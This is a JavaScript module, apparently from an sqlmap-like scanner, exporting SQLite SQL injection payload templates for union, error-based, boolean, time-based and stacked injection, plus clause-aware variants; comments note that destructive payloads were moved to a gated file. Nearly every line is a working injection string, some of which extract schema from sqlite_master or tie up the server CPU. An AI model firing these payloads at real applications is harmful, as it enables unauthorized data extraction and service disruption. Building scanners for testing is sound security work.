// SQLite payload 模板（从 payloads.js 拆分）
// 占位符：{ORIG}=原始值 {SLEEP}=延迟秒数 {NUM}=随机整数 {SEP}=注释符

export const sqlitePayloads = {
  union: [
    "{ORIG} UNION SELECT {NUM},sqlite_version(),'-- -",
    "{ORIG}' UNION SELECT {NUM},sqlite_version(),'-- -",
    // （原数组内 1 条精确重复已去重，替换为有效变体）
    "{ORIG} UNION ALL SELECT {NUM},sqlite_version(),'-- -",
    "{ORIG}' UNION ALL SELECT {NUM},sqlite_version(),'-- -",
    "{ORIG}) UNION SELECT {NUM},sqlite_version(),'-- -",
    "{ORIG}')) UNION SELECT {NUM},sqlite_version(),'-- -",
    '{ORIG}") UNION SELECT {NUM},sqlite_version(),"-- -',
    "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(name) FROM sqlite_master WHERE type='table'),'-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),'-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT sql FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT 1),'-- -",
    "{ORIG} UNION ALL SELECT {NUM},(SELECT count(*) FROM sqlite_master),'-- -",
    "{ORIG} UNION SELECT {NUM},sqlite_version(),(SELECT group_concat(name) FROM pragma_database_list),'-- -",
    // —— 扩容：多列探测（NULL + 数值 + sqlite_master.sql 建表语句列，随机 NULL 与 CAST 混合对标 sqlmap）——
    "{ORIG} UNION SELECT NULL,1,sql FROM sqlite_master-- -",
    // —— 深度扩容：UNION 类型变体（常量列宽 + 版本/表名/sql 目标；对标 sqlmap union 矩阵）——
    "{ORIG} UNION SELECT 1,2,sqlite_version()-- -",
    "{ORIG} UNION SELECT NULL,NULL,sql FROM sqlite_master-- -",
    "{ORIG} UNION SELECT 1,2,3-- -",
    "{ORIG} UNION SELECT 1,2,3,4-- -",
    "{ORIG}' UNION SELECT 1,2,sqlite_version()-- -",
    "{ORIG}' UNION SELECT 1,2,(SELECT group_concat(name) FROM sqlite_master WHERE type='table')-- -",
    "{ORIG} UNION SELECT 1,2,(SELECT sql FROM sqlite_master WHERE type='table' LIMIT 1)-- -",
    "{ORIG} UNION SELECT 1,2,3 FROM pragma_database_list-- -",
  ],
  // SQLite 类型宽松，经典 MySQL floor(rand) 报错对其无效；改用其真实报错向量：
  // 调用不存在的函数 / 表，触发 "no such function" / "no such table"
  error: [
    "{ORIG}' AND badfunc_sqli_probe()=1-- -",
    '{ORIG}" AND badfunc_sqli_probe()=1-- -',
    "{ORIG}' AND (SELECT 1 FROM non_existent_sqli_table)-- -",
    // —— 扩容：多行子查询（"sub-select returns 2 rows - expected 1"）/ JSON 解析 / typeof 族 ——
    "{ORIG}' AND (SELECT 1 UNION SELECT 2)-- -",
    "{ORIG}' AND 1=(SELECT 1 UNION SELECT 2)-- -",
    '{ORIG}" AND (SELECT 1 UNION SELECT 2)-- -',
    "{ORIG}' AND (SELECT json((SELECT group_concat(name) FROM sqlite_master)))-- -",
    "{ORIG}' AND (SELECT typeof((SELECT 1 UNION SELECT 2)))='integer'-- -",
    // —— 深度扩容：no such table/column/function 多目标 + 多行子查询 + JSON 解析族 ——
    "{ORIG}' AND (SELECT 1 FROM sqlite_sqli_nonexistent_tbl)-- -",
    '{ORIG}" AND (SELECT 1 FROM non_existent_sqli_table)-- -',
    "{ORIG}' AND badfunc_sqli_probe_2()=1-- -",
    "{ORIG}' AND (SELECT json('{bad json'))-- -",
    "{ORIG}' AND (SELECT (SELECT 1) UNION SELECT 2)-- -",
    "{ORIG}' AND (SELECT nonexistent_col FROM sqlite_master)-- -",
    "{ORIG}' AND (SELECT 1 FROM sqlite_master WHERE nonexistent_col=1)-- -",
    "{ORIG}' AND (SELECT json((SELECT sql FROM sqlite_master LIMIT 1)))-- -",
    // [SQLMAP-PARITY] json type mismatch / typeof type extraction
    "{ORIG}' AND json('{\"a\": 1}') != json('{\"a\": 2}')-- -",
    "{ORIG}' AND typeof((SELECT sqlite_version()))='text'-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
    // [8] 注释符变体（/**/ 块注释结尾，SQLite 支持 -- 与 /**/；WAF 绕过 / 尾注释双通道）
    "{ORIG}' AND '1'='1/**/",
    // —— 深度扩容：子查询布尔（sqlite_version 首字符 / 表存在 / 类型函数；真假对）——
    "{ORIG} AND (SELECT SUBSTR(sqlite_version(),1,1))='3'-- -",
    "{ORIG} AND (SELECT SUBSTR(sqlite_version(),1,1))='x'-- -",
    "{ORIG}' AND (SELECT SUBSTR(sqlite_version(),1,1))='3'-- -",
    "{ORIG}' AND (SELECT SUBSTR(sqlite_version(),1,1))='x'-- -",
    "{ORIG} AND (SELECT COUNT(*) FROM sqlite_master)>0-- -",
    "{ORIG} AND (SELECT COUNT(*) FROM sqlite_master)<0-- -",
    "{ORIG} AND EXISTS(SELECT 1)-- -",
    "{ORIG} AND EXISTS(SELECT 1 WHERE 1=2)-- -",
    "{ORIG} AND (SELECT typeof(sqlite_version()))='text'-- -",
    "{ORIG} AND (SELECT typeof(sqlite_version()))='integer'-- -",
    "{ORIG} AND (SELECT length(sqlite_version()))>0-- -",
    "{ORIG} AND (SELECT length(sqlite_version()))<0-- -",
    // [SQLMAP-PARITY] IIF inline if / NULLIF boolean
    "{ORIG}' AND IIF(1=1, 1, 0)=1-- -",
    "{ORIG}' AND NULLIF(1, 1) IS NULL-- -",
  ],
  time: [
    "{ORIG}' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)-- -",
    '{ORIG}" AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)-- -',
    "{ORIG} AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)-- -",
    // —— 扩容：括号闭合组合 + 更重交叉积 / 过滤重运算 ——
    "{ORIG}') AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d)-- -",
    "{ORIG}')) AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b)-- -",
    "{ORIG}' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c WHERE b.name LIKE '%a%')-- -",
    // —— 扩容：LIKE 重运算时间盲注（SQLite 无原生 SLEEP，用 LIKE(大块 HEX(RANDOMBLOB)) 重运算近似延迟；/**/ 注释变体）——
    // 注：RANDOMBLOB(50000000) 已移入 destructive.js（risk≥3 门控）。
    // —— 深度扩容：RANDOMBLOB 重运算规模变体 + 5 表交叉积（伪延迟）——
    // [P1 批次 2026-09-08] 降杀伤夹顶 5MB：10MB/25MB 变体在低端目标上 CPU 重运算可 >10s
    // 熔断超时（与 TIME_VECTORS.SQLite 同口径）；延迟区分度在 5MB 内已足够（阈值 800ms）。
    "{ORIG}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5000000))))-- -",
    "{ORIG}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(MIN(({SLEEP}*5000000),5000000)))))-- -",
    "{ORIG}' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d, sqlite_master e)-- -",
    // [SQLMAP-PARITY] cross join heavy cartesian（重查询延迟，无写操作）
    "{ORIG}' AND (SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d)>0-- -",
    // 注：硬编码 RANDOMBLOB(10000000)（10MB 内存/CPU 尖峰）已移出默认池，见 destructive.js。
  ],
  // 堆叠注入：以 `;` 追加独立语句（SQLite 无原生 SLEEP，用重运算近似延迟以确认堆叠可执行）
  stacked: [
    "{ORIG}; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
    "{ORIG}'; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
    "{ORIG}); SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
    "{ORIG}') ; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
    // 注：load_extension（加载原生扩展 = 任意代码执行）已移出默认池，见 destructive.js。
    // 注：ATTACH DATABASE（服务端建库写文件）与 load_extension（加载原生扩展 = 任意代码执行）
    // 已移出默认池，见 destructive.js（需 risk>=3 显式开启）。
  ],
};

// SQLite 子句位置感知模板（CLAUSE_PAYLOADS.SQLite）
export const sqliteClauses = {
  // ORDER BY 列位置：假模板多行子查询触发 "sub-select returns 2 rows - expected 1"
  orderby: {
    boolean: [["{ORIG},(SELECT 1)-- -", "{ORIG},(SELECT 1 UNION SELECT 2)-- -"]],
    time: ["{ORIG},(SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d)-- -"],
  },
  groupby: {
    boolean: [
      ["{ORIG} HAVING 1=1-- -", "{ORIG} HAVING 1=2-- -"],
      ["{ORIG}' HAVING '1'='1'-- -", "{ORIG}' HAVING '1'='2'-- -"],
    ],
  },
  having: {
    boolean: [["{ORIG} AND 1=1-- -", "{ORIG} AND 1=2-- -"]],
  },
  where: {
    boolean: [
      ["{ORIG}') AND 1=1-- -", "{ORIG}') AND 1=2-- -"],
      ["{ORIG}')) AND '1'='1'-- -", "{ORIG}')) AND '1'='2'-- -"],
      ['{ORIG}") AND 1=1-- -', '{ORIG}") AND 1=2-- -'],
    ],
  },
};